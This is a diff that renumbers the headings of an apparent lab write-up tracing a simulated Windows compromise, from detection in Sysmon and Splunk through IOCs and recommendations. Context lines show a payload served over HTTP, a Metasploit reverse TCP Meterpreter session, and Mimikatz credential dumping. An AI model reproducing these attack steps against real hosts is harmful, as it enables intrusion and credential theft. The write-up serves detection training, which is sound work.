@@ -29,7 +29,7 @@ The main setup was:
 
 I used this setup to follow the activity from the initial network connection and file download through execution, post-exploitation activity, detection in Sysmon, and finally investigation and hunting in Splunk.
 
-## 2. Environment Summary
+## 1.1. Environment Summary
 
 | Role | Host | OS / Tooling |
 |---|---|---|
@@ -42,9 +42,9 @@ I used this setup to follow the activity from the initial network connection and
 
 ---
 
-## 3. Adversary Simulation & Attack Execution
+## 2. Adversary Simulation & Attack Execution
 
-### 3.1 Hosting the Payload
+### 2.1 Hosting the Payload
 
 I first prepared the payload on the Kali machine and used a simple Python HTTP server to make it available to the Windows host. The HTTP log shows the victim connecting to the server and requesting `stageless.exe`, confirming that the file was successfully delivered over the network.
 
@@ -60,7 +60,7 @@ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 192.168.133.136 - - [24/Sep/2026 09:21:17] "GET /favicon.ico HTTP/1.1" 404 -
 ```
 
-### 3.2 Metasploit Handler & Initial Access
+### 2.2 Metasploit Handler & Initial Access
 
 After the file was delivered, I started the Metasploit handler and waited for the Windows system to connect back. The reverse TCP connection was established from the victim to Kali on port `4444`, which gave me the Meterpreter session used for the rest of the attack simulation.
 
@@ -82,7 +82,7 @@ msf exploit(multi/handler) > run
 [*] Meterpreter session 1 opened (192.168.133.142:4444 -> 192.168.133.136:49867) at 2026-09-24 09:22:22 -0400
 ```
 
-### 3.3 Uploading Mimikatz & Dumping Credentials
+### 2.3 Uploading Mimikatz & Dumping Credentials
 
 Once the Meterpreter session was available, I uploaded Mimikatz to the Windows host and used the Kiwi extension to test credential-access activity. The output showed the `username` account and its NTLM/SHA1 values, while the WDigest and Kerberos password fields were empty.
 
@@ -649,7 +649,7 @@ Image: C:\Users\username\Downloads\stageless.exe
 User: DESKTOP-BP3ESIC\username
 ```
 
-### 3.4 Indicators of Compromise (IOC) Summary
+### 4 Indicators of Compromise (IOC) Summary
 
 I collected the main indicators from the investigation so they could be used for future searches or detection rules. These include the payload name and hashes, delivery URL, C2 address and port, dropped Mimikatz file, and affected host information.
 
@@ -670,7 +670,7 @@ I collected the main indicators from the investigation so they could be used for
 
 ---
 
-### 3.5 Consolidated Timeline
+### 5 Consolidated Timeline
 
 I connected the attack-side activity with the detection-side evidence so the timeline shows what happened first and how the same activity appeared in Wireshark, Sysmon, VirusTotal, and Splunk. The Metasploit timestamps shown with `-0400` are aligned with the Sysmon UTC timestamps below.
 
@@ -695,7 +695,7 @@ This correlation shows the complete flow: **HTTP delivery → file download → 
 
 ---
 
-### 3.6 Detection & Response Recommendations
+### 6 Detection & Response Recommendations
 
 Based on the activity observed during the lab, I noted several practical detection and response ideas. These focus on the network connection, downloaded executable, suspicious file creation, process behavior, and Splunk correlation opportunities.
 
